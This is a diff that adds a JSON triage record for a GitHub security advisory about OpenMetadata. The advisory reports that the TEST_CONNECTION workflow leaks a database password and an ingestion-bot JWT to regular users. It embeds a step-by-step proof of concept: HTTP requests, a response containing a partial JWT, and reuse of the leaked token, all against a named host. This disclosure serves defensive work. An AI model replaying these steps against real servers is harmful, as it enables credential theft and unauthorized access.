@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/13410804?v=4\", \"events_url\": \"https://api.github.com/users/JorgeCampoverdeA/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/JorgeCampoverdeA/followers\", \"following_url\": \"https://api.github.com/users/JorgeCampoverdeA/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/JorgeCampoverdeA/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/JorgeCampoverdeA\", \"id\": 13410804, \"login\": \"JorgeCampoverdeA\", \"node_id\": \"MDQ6VXNlcjEzNDEwODA0\", \"organizations_url\": \"https://api.github.com/users/JorgeCampoverdeA/orgs\", \"received_events_url\": \"https://api.github.com/users/JorgeCampoverdeA/received_events\", \"repos_url\": \"https://api.github.com/users/JorgeCampoverdeA/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/JorgeCampoverdeA/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/JorgeCampoverdeA/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/JorgeCampoverdeA\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46481\", \"cvss\": {\"score\": 8.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-201\", \"name\": \"Insertion of Sensitive Information Into Sent Data\"}], \"description\": \"**This is not applicable if an application is configuring the Secrets Store to store credentials. Please make sure to follow the best practices when deploying in production**\\nIn OpenMetadata 1.12.1, a non-admin SSO user can trigger a `TEST_CONNECTION` workflow for a Database Service and receive, in the HTTP 201 response of `POST /api/v1/automations/workflows`, both:\\n\\n- The cleartext database password in `request.connection.config.password`.\\n- The ingestion bot JWT in `openMetadataServerConnection.securityConfig.jwtToken`.\\n\\nThe leaked ingestion-bot token can then be reused as `Authorization: Bearer <jwt>` to access sensitive service APIs (for example, `GET /api/v1/services/databaseServices/{id}?include=all`) with bot-level privileges.\\n\\nThis looks different from GHSA-pqqf-7hxm-rj5r, because it affects the `automations/workflows` TEST_CONNECTION endpoint on OpenMetadata 1.12.1, not the ingestion pipelines endpoints.\\n\\n---\\n\\nVersion / Product\\n\\n- Product: OpenMetadata (open source, Apache 2.0)\\n- Version: 1.12.1\\n  - GET /api/v1/system/version →\\n    {\\\"version\\\":\\\"1.12.1\\\",\\\"revision\\\":\\\"618a2dc2ec8f70ffcd0378ee14ce92cb4f98f0c5\\\"}\\n- Deployment: OpenMetadata server with SSO via Azure AD (OAuth), Oracle database service, secrets in DB secrets manager (`secretsManagerProvider: \\\"db\\\"`).\\n\\n---\\n\\nPreconditions\\n\\n- Authenticated SSO user with access to the UI.\\n- User can open a Database Service and click “Test connection”.\\n- No server admin role, no shell/DB access.\\n\\n---\\n\\nPoC (short)\\n\\n1) Login as a regular SSO user.\\n\\n2) In the UI go to:\\n   Settings → Services → Database Services → utplrac_scan2_srvetel  \\n   Open the connection tab and click “Test connection”.\\n\\n3) The browser sends:\\n\\nPOST /api/v1/automations/workflows HTTP/1.1\\nHost: catalogodatos-test.utpl.edu.ec\\nAuthorization: Bearer <Azure_AD_user_JWT>\\nContent-Type: application/json\\n\\n{\\n  \\\"name\\\": \\\"test-connection-Oracle-XXXX\\\",\\n  \\\"workflowType\\\": \\\"TEST_CONNECTION\\\",\\n  \\\"request\\\": {\\n    \\\"connection\\\": {\\n      \\\"config\\\": {\\n        \\\"type\\\": \\\"Oracle\\\",\\n        \\\"scheme\\\": \\\"oracle+cx_oracle\\\",\\n        \\\"username\\\": \\\"qpro_gobierno_datos\\\",\\n        \\\"password\\\": \\\"********\\\",\\n        \\\"hostPort\\\": \\\"172.16.54.32:1521\\\",\\n        ...\\n      }\\n    },\\n    \\\"serviceType\\\": \\\"Database\\\",\\n    \\\"connectionType\\\": \\\"Oracle\\\",\\n    \\\"serviceName\\\": \\\"utplrac_scan2_srvetel\\\"\\n  }\\n}\\n\\nNote: in the request the password is masked as \\\"********\\\".\\n\\n4) The server responds with HTTP 201 and a body similar to:\\n\\n{\\n  \\\"id\\\": \\\"5acd06f0-0db6-43b9-b0e0-e1574479bba7\\\",\\n  \\\"workflowType\\\": \\\"TEST_CONNECTION\\\",\\n  \\\"request\\\": {\\n    \\\"connection\\\": {\\n      \\\"config\\\": {\\n        \\\"type\\\": \\\"Oracle\\\",\\n        \\\"scheme\\\": \\\"oracle+cx_oracle\\\",\\n        \\\"username\\\": \\\"qpro_gobierno_datos\\\",\\n        \\\"password\\\": \\\"<REAL_PASSWORD_HERE>\\\",\\n        \\\"hostPort\\\": \\\"172.16.54.32:1521\\\",\\n        ...\\n      }\\n    },\\n    \\\"serviceType\\\": \\\"Database\\\",\\n    \\\"connectionType\\\": \\\"Oracle\\\",\\n    \\\"serviceName\\\": \\\"utplrac_scan2_srvetel\\\",\\n    \\\"secretsManagerProvider\\\": \\\"db\\\"\\n  },\\n  \\\"openMetadataServerConnection\\\": {\\n    \\\"type\\\": \\\"OpenMetadata\\\",\\n    \\\"hostPort\\\": \\\"http://openmetadata-server:8585/api\\\",\\n    \\\"authProvider\\\": \\\"openmetadata\\\",\\n    \\\"securityConfig\\\": {\\n      \\\"jwtToken\\\": \\\"eyJraWQiOiJHYjM4OWEtOWY3Ni1nZGpzLWE5MmotMDI0MmJrOTQzNTYiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6ImluZ2VzdGlvbi1ib3QiLCJyb2xlcyI6WyJJbmdlc3Rpb25Cb3RSb2xlIl0sImVtYWlsIjoiaW5nZXN0aW9uLWJvdEBvcGVuLW1ldGFkYXRhLm9yZyIsImlzQm90Ijp0cnVlLCJ0b2tlblR5cGUiOiJCT1QiLCJ1c2VybmFtZSI6ImluZ2VzdGlvbi1ib3QiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJpbmdlc3Rpb24tYm90IiwiaWF0IjoxNzc0MDI2Nzg3LCJleHAiOjE3ODE4MDI3ODd9.DHLw4s...\\\"\\n    },\\n    ...\\n  },\\n  \\\"updatedBy\\\": \\\"<regular_user>\\\",\\n  ...\\n}\\n\\nKey points:\\n- request.connection.config.password now contains the real Oracle DB password in cleartext.\\n- openMetadataServerConnection.securityConfig.jwtToken contains a valid JWT for the ingestion-bot account (sub = \\\"ingestion-bot\\\", tokenType = \\\"BOT\\\").\\n\\n5) Reuse the leaked ingestion-bot JWT:\\n\\nGET /api/v1/services/databaseServices/f0382c0b-149e-4ca5-8844-d636c3437b9d?include=all HTTP/1.1\\nHost: catalogodatos-test.utpl.edu.ec\\nAuthorization: Bearer <leaked_ingestion-bot_JWT>\\nAccept: application/json\\n\\nThe API returns the full database service including username and password, confirming bot-level access.\\n\\n---\\n\\nImpact / Severity\\n\\n- Any user who can run “Test connection” on a database service can:\\n  - Recover the cleartext DB credentials.\\n  - Recover a long‑lived ingestion-bot JWT.\\n  - Act as ingestion-bot against the OpenMetadata API and access/modify services and metadata.\\n\\n**\\n<img width=\\\"1256\\\" height=\\\"653\\\" alt=\\\"LOWLEVELTOKEN\\\" src=\\\"https://github.com/user-attachments/assets/e5b45edb-be51-493a-b4d0-25175cdf7cbc\\\" />\\n<img width=\\\"194\\\" height=\\\"339\\\" alt=\\\"USERROL\\\" src=\\\"https://github.com/user-attachments/assets/04005616-4c7b-4b27-90f6-a8e1a974712b\\\" />\\n<img width=\\\"972\\\" height=\\\"389\\\" alt=\\\"CLEARPOC\\\" src=\\\"https://github.com/user-attachments/assets/fdb26b59-782e-4a6b-a595-cdfb7ea68984\\\" />**\", \"epss\": {\"percentage\": 0.00241, \"percentile\": 0.1495}, \"ghsa_id\": \"GHSA-9vmh-whc4-7phg\", \"github_reviewed_at\": \"2026-05-21T16:36:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-9vmh-whc4-7phg\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9vmh-whc4-7phg\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46481\"}], \"nvd_published_at\": \"2026-06-08T17:16:51Z\", \"published_at\": \"2026-05-21T16:36:25Z\", \"references\": [\"https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-9vmh-whc4-7phg\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46481\", \"https://github.com/advisories/GHSA-9vmh-whc4-7phg\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-metadata/OpenMetadata/security-advisories/GHSA-9vmh-whc4-7phg\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/open-metadata/OpenMetadata\", \"summary\": \"OpenMetadata: TEST_CONNECTION workflow leaks ingestion-bot JWT and database password to regular users\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T13:12:16Z\", \"url\": \"https://api.github.com/advisories/GHSA-9vmh-whc4-7phg\", \"vulnerabilities\": [{\"first_patched_version\": \"1.12.4\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.open-metadata:openmetadata-service\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.12.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9vmh-whc4-7phg",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "org.open-metadata:openmetadata-service: < 1.12.4"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-46481"
+    ],
+    "cvss_score": 8.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "org.open-metadata:openmetadata-service"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.450529Z",
+  "provenance": {
+    "content_sha256": "90b2418f571bb1da3cd077e185375f0238762bd42d76e1b4197d16b1fb17c094",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-21T16:36:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9vmh-whc4-7phg",
+  "status": "active",
+  "title": "OpenMetadata: TEST_CONNECTION workflow leaks ingestion-bot JWT and database password to regular users",
+  "updated_at": "2026-06-09T13:12:16Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9vmh-whc4-7phg"
+}
